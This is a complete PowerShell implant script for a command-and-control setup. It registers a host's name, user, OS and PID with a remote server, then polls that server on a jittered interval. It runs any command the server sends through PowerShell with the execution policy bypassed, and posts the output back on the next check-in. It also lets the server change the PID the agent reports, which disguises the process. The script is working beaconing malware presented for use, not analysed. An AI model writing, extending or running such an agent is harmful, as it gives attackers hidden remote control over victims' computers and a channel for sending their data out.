param(
  [string]$WHost = '10.10.150.11',
  [int]$WPort = 80,
  [string]$Key = '448b5e4bf0d8d311e4e94b79868885206ebaefce7294bbbb119a2467a9d9b6e3',
  [int]$MinBackoffSec = 5,
  [int]$MaxBackoffSec = 120
)

$ErrorActionPreference = 'Stop'
$baseUri = "http://$($WHost):$($WPort)"
$registerUri = "$baseUri/api/data"
$pollUri     = "$baseUri/api/health"

# Local, runtime-tunable settings (can be changed by server taskings)
# - $reportedPid: what we report to server as our PID (initially current $pid)
# - $callbackInterval: seconds between polls (baseline, before jitter)
# - $jitterPct: +/- percentage applied to interval for jitter
$reportedPid      = $pid
$callbackInterval = 60
$jitterPct        = 15
$pendingTaskResult = $null

function Get-AgentProfile {
  $os = (Get-CimInstance Win32_OperatingSystem)
  $json = [pscustomobject]@{
    agent_key         = $Key
    hostname          = $env:COMPUTERNAME
    ip_addr           = @('10.10.150.11')   # swap/augment as needed
    os                = $os.Caption
    build             = ( "$os.BuildNumber  $os.Version")
    pid               = $reportedPid
    user              = "$env:USERDOMAIN/$env:USERNAME"
    cwd               = (Get-Location).Path
    callback_interval = $callbackInterval
    jitter_value      = $jitterPct
    default_shell     = 'powershell'
    IntegrityLevel    = 'user'
  } | ConvertTo-Json -Depth 4
  return $json
}

function Register-Agent {
  $body = Get-AgentProfile
  $resp = Invoke-WebRequest -Uri $registerUri -Method POST -ContentType 'application/json' -Body $body
  $obj  = $resp.Content | ConvertFrom-Json
  [pscustomobject]@{
    StatusCode       = $resp.StatusCode
    SessionToken     = $obj.session_token
    # Some servers return "interval" instead of "callback_interval"; support both
    CallbackInterval = if ($obj.callback_interval) { [int]$obj.callback_interval } elseif ($obj.interval) { [int]$obj.interval } else { $null }
    Raw              = $obj
  }
}

function Poll-Once {
  param([string]$SessionToken)

  $headers = @{}
  if ($SessionToken) { $headers['If-None-Match'] = $SessionToken }

  try {
    $r = Invoke-WebRequest -Uri $pollUri -Method GET -Headers $headers
    $code = [int]$r.StatusCode
    if ($code -eq 200) {
      $data = $r.Content | ConvertFrom-Json
      return [pscustomobject]@{
        Code            = 200
        Data            = $data
        # Accept either callback_interval or interval from server
        CallbackInterval= if ($data.callback_interval) { [int]$data.callback_interval } elseif ($data.interval) { [int]$data.interval } else { $null }
        NewSessionToken = if ($data.session_token) { $data.session_token } else { $null }
      }
    } else {
      return [pscustomobject]@{ Code = $code; Data = $null }
    }
  } catch [System.Net.WebException] {
    $resp = $_.Exception.Response
    if ($resp) {
      $code = [int]$resp.StatusCode
      if ($code -eq 304) {
        return [pscustomobject]@{ Code = 304; Data = $null }
      }
      return [pscustomobject]@{ Code = $code; Data = $null; Error = $_.Exception.Message }
    }
    return [pscustomobject]@{ Code = -1; Data = $null; Error = $_.Exception.Message }
  }
}

# Applies dynamic tasking/config values from server payload
function Apply-Tasking {
  param(
    [Parameter(Mandatory=$false)] [object]$Data
  )
  if (-not $Data) { return }

  # Some servers may wrap settings; support both top-level and nested shapes
  $cfg = $Data
  if ($Data.settings) { $cfg = $Data.settings }
  if ($Data.config)   { $cfg = $Data.config }

  $dirty = $false

  # Helper to parse ints safely
  function _toInt($v, $fallback) {
    try { if ($null -ne $v -and $v -ne '') { return [int]$v } } catch {}
    return $fallback
  }

  # callback interval
  $newInterval = $null
  if ($cfg.PSObject.Properties.Name -contains 'callback_interval') { $newInterval = _toInt $cfg.callback_interval $null }
  elseif ($cfg.PSObject.Properties.Name -contains 'interval') { $newInterval = _toInt $cfg.interval $null }
  if ($null -ne $newInterval -and $newInterval -ge 1 -and $newInterval -le 86400) {
    if ($script:callbackInterval -ne $newInterval) {
      $script:callbackInterval = $newInterval
      Write-Host ("[tasking] Updated callback interval -> {0}s" -f $script:callbackInterval)
      $dirty = $true
    }
  }

  # jitter percentage
  $newJitter = $null
  foreach ($k in @('jitter_value','jitter','jitter_pct')) {
    if ($cfg.PSObject.Properties.Name -contains $k) { $newJitter = _toInt $cfg.$k $null; break }
  }
  if ($null -ne $newJitter -and $newJitter -ge 0 -and $newJitter -le 100) {
    if ($script:jitterPct -ne $newJitter) {
      $script:jitterPct = $newJitter
      Write-Host ("[tasking] Updated jitter -> {0}%" -f $script:jitterPct)
      $dirty = $true
    }
  }

  # reported PID
  $newPid = $null
  if ($cfg.PSObject.Properties.Name -contains 'pid') { $newPid = _toInt $cfg.pid $null }
  if ($null -ne $newPid -and $newPid -ge 0) {
    if ($script:reportedPid -ne $newPid) {
      $script:reportedPid = $newPid
      Write-Host ("[tasking] Updated reported PID -> {0}" -f $script:reportedPid)
      $dirty = $true
    }
  }

  if ($dirty) {
    # Reflect new settings in current run; values will be sent on next re-registration only.
    # This script doesn't push updates to the server other than at check-in.
  }
}

# Run a task command and capture stdout/stderr as a string
function Invoke-AgentTask {
  param(
    [Parameter(Mandatory=$true)] [string]$Command
  )
  try {
    # Run in a fresh PowerShell to minimize side-effects; capture all output
    $out = & powershell -NoProfile -ExecutionPolicy Bypass -Command $Command 2>&1 | Out-String
    if ($null -eq $out) { $out = '' }
    return $out
  } catch {
    return ("[task error] {0}" -f $_.Exception.Message)
  }
}

# Submit any pending result back to server (on next check-in)
function Submit-TaskResult {
  param(
    [Parameter(Mandatory=$true)] [string]$ResultText,
    [Parameter(Mandatory=$true)] [string]$SessionToken
  )
  try {
    $payload = [pscustomobject]@{
      agent_key     = $Key
      session_token = $SessionToken
      task_result   = $ResultText
      hostname      = $env:COMPUTERNAME
      when          = (Get-Date).ToString('o')
    } | ConvertTo-Json -Depth 4
    $r = Invoke-WebRequest -Uri $registerUri -Method POST -ContentType 'application/json' -Body $payload
    if ([int]$r.StatusCode -ge 200 -and [int]$r.StatusCode -lt 300) {
      Write-Host "[task] Submitted result (${($ResultText.Length)} chars)."
      return $true
    }
    Write-Host "[task] Submit failed: HTTP $($r.StatusCode)"
    return $false
  } catch {
    Write-Host ("[task] Submit error: {0}" -f $_.Exception.Message)
    return $false
  }
}

# --- main ---
Write-Verbose "Registering agent at $registerUri"
$reg = Register-Agent
if ($reg.StatusCode -ne 200 -and $reg.StatusCode -ne 201) {
  throw "Registration failed: HTTP $($reg.StatusCode)"
}

$sessionToken     = $reg.SessionToken
$callbackInterval = if ($reg.CallbackInterval) { $reg.CallbackInterval } else { $callbackInterval }
if (-not $sessionToken) { throw "No session_token received at registration." }

Write-Host "Registered. SessionToken=$sessionToken, interval=${callbackInterval}s"

$backoff = $MinBackoffSec
while ($true) {
  $tickStart = Get-Date
  # If we have a pending result from a previously executed task, push it up first
  if ($pendingTaskResult -and $pendingTaskResult.Trim().Length -gt 0) {
    if (Submit-TaskResult -ResultText $pendingTaskResult -SessionToken $sessionToken) {
      $pendingTaskResult = $null
    }
  }
  $poll = Poll-Once -SessionToken $sessionToken

  switch ($poll.Code) {
    200 {
      if ($poll.NewSessionToken) { $sessionToken = $poll.NewSessionToken }
      # Apply any tasking/settings returned by the server
      if ($poll.Data) { Apply-Tasking -Data $poll.Data }
      if ($poll.CallbackInterval) { $callbackInterval = $poll.CallbackInterval }

      # If a task was supplied, execute and hold the result for the next check-in
      $taskCmd = $null
      if ($poll.Data -and $poll.Data.PSObject -and $poll.Data.PSObject.Properties.Name -contains 'Task') {
        $taskCmd = [string]$poll.Data.Task
      } elseif ($poll.Data -and $poll.Data.PSObject -and $poll.Data.PSObject.Properties.Name -contains 'task') {
        $taskCmd = [string]$poll.Data.task
      }
      if ($taskCmd -and $taskCmd.Trim().Length -gt 0) {
        Write-Host ("[task] Executing: {0}" -f $taskCmd)
        $res = Invoke-AgentTask -Command $taskCmd
        # Keep result modest to avoid overly large posts
        $maxLen = 32768
        if ($res.Length -gt $maxLen) { $res = $res.Substring(0, $maxLen) + "... [truncated]" }
        $pendingTaskResult = $res
        Write-Host ("[task] Captured {0} chars; will return next check-in." -f $pendingTaskResult.Length)
      }

      # Do something with $poll.Data if your server actually sends work.
      # For now, just log the fact we got fresh content.
      Write-Host ("[{0:u}] Work payload received: {1}" -f (Get-Date), ($poll.Data | ConvertTo-Json -Depth 6))
      $backoff = $MinBackoffSec
    }
    304 {
      # No changes. Quiet by design.
      $backoff = $MinBackoffSec
    }
    default {
      # Transient hiccup or server gripe—backoff with jitter.
      $jitter = Get-Random -Minimum 0 -Maximum ([math]::Max(1,[int]($backoff/3)))
      $sleep  = [math]::Min($MaxBackoffSec, $backoff + $jitter)
      Write-Host ("[{0:u}] Poll error code {1}. Backing off {2}s." -f (Get-Date), $poll.Code, $sleep)
      Start-Sleep -Seconds $sleep
      $backoff = [math]::Min($MaxBackoffSec, [int]([math]::Ceiling($backoff * 1.8)))
      continue
    }
  }

  # Honor interval (minus the time we just spent)
  $elapsed = [int]((Get-Date) - $tickStart).TotalSeconds
  # Jittered interval: +/- $jitterPct% of baseline interval
  $base = [math]::Max(0, $callbackInterval - $elapsed)
  $jDelta = [int]([math]::Round($callbackInterval * ($jitterPct / 100.0)))
  if ($jDelta -lt 0) { $jDelta = 0 }
  $minJ = -1 * $jDelta
  $maxJ = $jDelta + 1
  $offset = if ($jDelta -gt 0) { Get-Random -Minimum $minJ -Maximum $maxJ } else { 0 }
  $sleepFor = [int]([math]::Max(0, $base + $offset))
  if ($sleepFor -gt 0) { Start-Sleep -Seconds $sleepFor }
}
